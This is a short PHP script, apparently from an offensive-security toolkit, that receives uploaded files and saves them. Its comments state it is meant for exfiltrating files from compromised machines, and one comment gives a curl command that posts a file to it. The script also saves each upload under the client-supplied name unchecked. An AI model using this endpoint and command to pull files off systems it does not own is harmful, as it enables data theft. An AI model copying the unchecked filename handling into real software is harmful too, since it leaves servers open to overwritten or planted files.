<?php
// Author: Kaimo <https://github.com/kaimosec>
// Handles php file uploads. A useful way to exfiltrate files when all else fails.
// Drop this on a webserver that supports PHP.
// Sending from Linux: Easy! Just use
//	curl -F "file=@kitty.jpg" http://127.0.0.1/upload.php
// Oh, you're sending from Windows? Just use a 50-line mess of a script at upload2php.ps1

// Check if the file was uploaded successfully
if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $tempFilePath = $_FILES['file']['tmp_name'];
    $originalFileName = $_FILES['file']['name'];

    // Move the temporary file to the current directory with its original name
    move_uploaded_file($tempFilePath, $originalFileName);

    // Output a success message
    echo "File uploaded successfully!";
} else {
    // Output an error message
    echo "Error uploading the file.";
}
?>
